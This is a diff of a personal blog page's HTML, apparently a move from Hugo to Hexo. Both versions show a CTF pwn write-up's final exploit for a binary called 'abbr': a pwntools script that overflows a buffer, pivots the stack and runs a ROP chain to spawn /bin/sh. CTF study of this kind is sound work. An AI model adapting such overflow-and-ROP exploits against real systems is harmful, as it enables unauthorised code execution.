-        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-
-<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
-</span><span class="s1">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
-</span><span class="s1">b* 0x402036
-</span><span class="s1">continue
-</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
-
-<span class="c1">#===========================================================</span>
-<span class="c1">#                    EXPLOIT GOES HERE</span>
-<span class="c1">#===========================================================</span>
-
-<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
-
-<span class="c1"># 000000000048ac90    80 FUNC    GLOBAL DEFAULT    7 _dl_make_stack_executable</span>
-<span class="c1"># 0x0000000000422930 : add rsp, 0x10 ; pop rbp ; ret</span>
-
-<span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
-<span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
-<span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>
-
-<span class="n">pld</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;wwwwww&#34;</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000405121</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
-
-<span class="c1"># 0x000000000045a8f7 : pop rax ; ret</span>
-<span class="c1"># 0x0000000000404cfe : pop rsi ; ret</span>
-<span class="c1"># 0x00000000004018da : pop rdi ; ret</span>
-<span class="c1"># 0x00000000004017df : pop rdx ; ret</span>
-<span class="c1"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>
-
-<span class="n">DATA_SEC</span> <span class="o">=</span> <span class="mh">0x0000000004c90e0</span>
-<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x00000000004018da</span>
-<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x0000000000404cfe</span>
-<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x000000000045a8f7</span>
-<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x00000000004017df</span>
-<span class="n">MOV_PTR_RDI_RSI</span> <span class="o">=</span> <span class="mh">0x000000000045684f</span>
-<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004012e3</span> <span class="c1"># syscall</span>
-
-<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DATA_SEC</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_PTR_RDI_RSI</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
-
-<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div>
-    </section>
-  </article>
-
-      </main>
-
-      <footer class="gblog-footer">
-  <nav class="container flex">
-    <div>
-      <section class="flex flex-wrap align-center">
-        
-          <span class="gblog-footer__item gblog-footer__item--row">
-            <svg class="icon gblog_rss_feed"><use xlink:href="#gblog_rss_feed"></use></svg>
-            <a href="/feed.xml" class="gblog-footer__link">Atom Feed</a>
-          </span>
-        
-        
-          
-
-  
-  
-  
-
-  
-    
-      
-      
-      
-
-      
-        <span class="gblog-footer__item gblog-footer__item--row">
-          
-            <svg class="icon gblog_email"><use xlink:href="#gblog_email"></use></svg>
-          
-          <a
-            href="
-              /
-            "
-            class="gblog-footer__link"
-          >
-            Contact
-          </a>
-        </span>
-      
-    
-  
-
-
-
-
-
+<h2 id="Final-exploit"><a href="#Final-exploit" class="headerlink" title="Final exploit"></a>Final exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe  = pwn.context.binary = pwn.ELF(<span class="string">&#x27;abbr&#x27;</span>)</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">b* 0x402036</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 000000000048ac90    80 FUNC    GLOBAL DEFAULT    7 _dl_make_stack_executable</span></span><br><span class="line"><span class="comment"># 0x0000000000422930 : add rsp, 0x10 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00000000004126e3 : call qword ptr [rax]</span></span><br><span class="line"><span class="comment"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000405121 : xchg eax, esp ; ret</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&quot;wwwwww&quot;</span></span><br><span class="line">pld += <span class="string">b&quot;A&quot;</span>*(<span class="number">0x1000</span>-<span class="number">16</span>) + pwn.p64(<span class="number">0x0000000000405121</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter text: &quot;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000045a8f7 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000404cfe : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004018da : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004017df : pop rdx ; ret</span></span><br><span class="line"><span class="comment"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span></span><br><span class="line"></span><br><span class="line">DATA_SEC = <span class="number">0x0000000004c90e0</span></span><br><span class="line">POP_RDI = <span class="number">0x00000000004018da</span></span><br><span class="line">POP_RSI = <span class="number">0x0000000000404cfe</span></span><br><span class="line">POP_RAX = <span class="number">0x000000000045a8f7</span></span><br><span class="line">POP_RDX = <span class="number">0x00000000004017df</span></span><br><span class="line">MOV_PTR_RDI_RSI = <span class="number">0x000000000045684f</span></span><br><span class="line">SYSCALL = <span class="number">0x00000000004012e3</span> <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">pld = pwn.p64(POP_RDI)</span><br><span class="line">pld += pwn.p64(DATA_SEC)</span><br><span class="line">pld += pwn.p64(POP_RSI)</span><br><span class="line">pld += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">pld += pwn.p64(MOV_PTR_RDI_RSI)</span><br><span class="line">pld += pwn.p64(POP_RSI)</span><br><span class="line">pld += pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(POP_RDX)</span><br><span class="line">pld += pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(POP_RAX)</span><br><span class="line">pld += pwn.p64(<span class="number">0x3b</span>)</span><br><span class="line">pld += pwn.p64(SYSCALL)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter text: &quot;</span>, pld)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
         
-        
-        
-      </section>
-      <section class="flex flex-wrap align-center">
-        <span class="gblog-footer__item">
-          Built with <a href="https://gohugo.io/" class="gblog-footer__link">Hugo</a> and
-          <svg class="icon gblog_heart"><use xlink:href="#gblog_heart"></use></svg>
-        </span>
-      </section>
-      
-      
-        <section class="flex flex-wrap align-center">
-          <span class="gblog-footer__item">
-            Content licensed under
-            <a href="https://spdx.org/licenses/Beerware.html" class="gblog-footer__link no-wrap">Beerware license</a>
-          </span>
-        </section>
-      
+      </div>
+
+         
     </div>
     
-      <div class="flex flex-25 justify-end">
-        <span class="gblog-footer__item text-right">
-          <a class="gblog-footer__link fake-link" href="#" aria-label="Back to top">
-            <svg class="icon gblog_keyborad_arrow_up">
-              <use xlink:href="#gblog_keyborad_arrow_up"></use>
-            </svg>
-            <span class="hidden-mobile">Back to top</span>
-          </a>
-        </span>
-      </div>
+     
+  </div>
+  
     
-  </nav>
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/posts/cloudinspect/"
+      title="[Hack.lu 2021 - pwn] Cloudinspect"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        [Hack.lu 2021 - pwn] Cloudinspect
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/posts/blindate/"
+      title="[FCSC 2021 - pwn] Blind Date"
+     >
+
+    <p class="title-text">
+      
+        [FCSC 2021 - pwn] Blind Date
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2023 nasm<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
 </footer>
 
     </div>
-  </body>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
 </html>
